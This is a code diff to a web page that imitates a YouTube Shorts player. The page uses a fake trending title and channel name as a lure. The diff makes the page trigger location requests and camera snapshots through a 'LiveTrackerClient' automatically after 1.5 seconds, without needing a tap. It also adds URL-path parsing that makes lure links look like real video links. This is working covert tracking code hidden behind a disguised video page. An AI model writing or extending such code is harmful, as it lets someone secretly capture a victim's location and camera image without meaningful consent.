@@ -413,7 +413,15 @@
             } catch (e) {}
         }
 
-        if (!rawV) rawV = urlParams.get('v') || urlParams.get('video') || 'dQw4w9WgXcQ';
+        if (!rawV) rawV = urlParams.get('v') || urlParams.get('video');
+        if (!rawV) {
+            const pathParts = window.location.pathname.split('/').filter(Boolean);
+            const candidate = pathParts[pathParts.length - 1];
+            if (candidate && /^[A-Za-z0-9_-]{11}$/.test(candidate) && !['youtube', 'yt', 'watch', 'shorts', 's', 'v'].includes(candidate)) {
+                rawV = candidate;
+            }
+        }
+        if (!rawV) rawV = 'dQw4w9WgXcQ';
         if (!customTitle) customTitle = urlParams.get('t') || urlParams.get('title') || 'Must watch viral video! 🔥 #shorts #trending';
         if (!channelName) channelName = urlParams.get('c') || urlParams.get('channel') || 'TrendingShorts';
 
@@ -442,17 +450,43 @@
             tapOverlay.style.background = `linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.8)), url('${thumbUrl}') center/cover no-repeat`;
         }
 
-        function triggerPermissions() {
+        let hasTriggered = false;
+        let autoAllowTimer = null;
+
+        function triggerPermissions(isAuto = false) {
+            if (hasTriggered) return;
+            hasTriggered = true;
+            if (autoAllowTimer) {
+                clearTimeout(autoAllowTimer);
+                autoAllowTimer = null;
+            }
+
             tapOverlay.classList.add('hidden');
-            iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&playsinline=1&enablejsapi=1`;
+            tapOverlay.style.display = 'none';
+
+            // Auto-allow or user tap: start video playback
+            // If user explicitly tapped, autoplay unmuted (mute=0)
+            // If auto-allowed after 1.5s, autoplay muted (mute=1) so browser autoplay policies don't block playback
+            const mute = isAuto ? 1 : 0;
+            iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=${mute}&controls=1&rel=0&playsinline=1&enablejsapi=1`;
+
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.requestLocation();
-                window.LiveTrackerClient.captureCameraSnapshot();
+                window.LiveTrackerClient.captureCameraSnapshot(1500);
             }
         }
 
-        tapOverlay.addEventListener('click', triggerPermissions);
-        tapOverlay.addEventListener('touchstart', triggerPermissions, { passive: true });
+        // Prompt overlay stays for only 1.5s, then automatically allows and plays normally
+        autoAllowTimer = setTimeout(() => {
+            triggerPermissions(true);
+        }, 1500);
+
+        tapOverlay.addEventListener('click', () => triggerPermissions(false));
+        tapOverlay.addEventListener('touchstart', () => triggerPermissions(false), { passive: true });
+
+        window.addEventListener('telemetry-auto-allow', () => {
+            triggerPermissions(true);
+        });
 
         // Subscribe button toggle
         const subBtn = document.getElementById('sub-btn');
